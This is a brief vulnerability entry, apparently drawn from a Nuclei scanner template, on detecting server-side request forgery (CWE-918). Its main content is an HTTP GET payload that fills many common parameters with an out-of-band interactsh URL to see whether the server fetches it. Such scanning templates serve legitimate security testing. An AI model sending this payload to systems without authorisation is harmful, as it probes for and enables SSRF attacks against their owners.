# Vulnerability: Parameter Based Generic OOB Interaction
**Classification:** CWE-918
**Source:** Nuclei Template (`oob-param-based-interaction.yaml`)

## Description
The remote server fetched a spoofed URL from the request parameters.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?u=http://{{interactsh-url}}/&href=http://{{interactsh-url}}/&action=http://{{interactsh-url}}/&host={{interactsh-url}}&http_host={{interactsh-url}}&email=root@{{interactsh-url}}&url=http://{{interactsh-url}}/&load=http://{{interactsh-url}}/&preview=http://{{interactsh-url}}/&target=http://{{interactsh-url}}/&proxy=http://{{interactsh-url}}/&from=http://{{interactsh-url}}/&src=http://{{interactsh-url}}/&ref=http://{{interactsh-url}}/&referrer=http://{{interactsh-url}}/
```

